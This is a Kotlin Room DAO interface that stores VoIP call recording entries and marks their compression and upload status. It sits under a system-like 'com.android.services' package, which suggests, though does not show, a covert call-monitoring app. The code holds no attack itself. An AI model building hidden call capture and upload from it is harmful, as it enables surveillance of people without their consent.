package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.VoipCall
import com.android.services.util.AppConstants

@Dao
interface VoipCallDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(voipCallList: List<VoipCall>)

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(voipCall: VoipCall)

    @Query("Update voip_call set status = :updated_status where file=:file")
    fun updateVoipCall(file: String, updated_status: Int): Int

    @Query("Select * from voip_call where status = :status and isCompressed=:is_compressed order by date DESC limit ${AppConstants.mediaFilesUploadLimit}")
    fun selectAllVoipCalls(status: Int, is_compressed: Int): List<VoipCall>

    @Query("Select uniqueId from voip_call where uniqueId = :unique_id")
    fun checkIfAlreadyExist(unique_id: String): String

    @Query("Update voip_call set isCompressed=:is_compressed where file=:file")
    fun updateCompressionStatus(file: String, is_compressed: Int): Int
}